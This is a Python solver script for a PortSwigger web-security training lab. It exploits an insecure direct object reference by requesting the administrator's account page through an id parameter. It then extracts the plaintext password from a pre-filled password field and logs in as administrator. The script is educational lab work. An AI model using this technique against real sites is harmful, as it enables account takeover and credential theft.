# Lab 10 — User ID controlled by request parameter with password disclosure
# PortSwigger: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure
#
# Vulnerability: Account page pre-fills a password input with the real
#                (visually masked) password value, directly in the HTML
# Aim:           Access administrator's account page and read their real password
#
# Technique:
#   Same IDOR pattern as Lab 07 (?id= parameter), but this time the leaked
#   data is the actual password — pre-filled into an <input type="password">
#   for UX convenience. type="password" only masks the RENDERED display;
#   the raw HTML value attribute still contains the real password in plaintext.
#
# Usage: python access_control_lab10.py <url>

import sys
import re
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 10 — IDOR WITH PASSWORD DISCLOSURE (administrator)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab10.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: request administrator's account page via the id parameter ───
    print("\n  ── Step 1: access /my-account?id=administrator\n")
    r = session.get(f"{url}/my-account", params={"id": "administrator"})
    check_status(r, 200, "administrator account access via IDOR")

    # ── Step 2: extract the password from the input's value attribute ───────
    print("\n  ── Step 2: extract the password input's value attribute\n")
    match = re.search(
        r'type=["\']password["\'][^>]*value=["\']([^"\']+)["\']',
        r.text
    )
    if not match:
        # try the other common attribute order: value before type
        match = re.search(
            r'value=["\']([^"\']+)["\'][^>]*type=["\']password["\']',
            r.text
        )

    if not match:
        print("  ✘  Could not auto-extract the password — inspect manually")
        print_box("Raw response snippet", r.text[:800])
        sys.exit(1)

    admin_password = match.group(1)
    print_box("LEAKED ADMINISTRATOR PASSWORD", admin_password)

    # ── Step 3: log in as administrator using the disclosed password ────────
    print("  ── Step 3: log in as administrator with the leaked password\n")
    admin_session = make_session(proxies)
    if login(admin_session, url, username="administrator", password=admin_password):
        print("\n  ✔  Successfully logged in as administrator")
    else:
        print("\n  ✘  Login failed — double check the extracted password value")
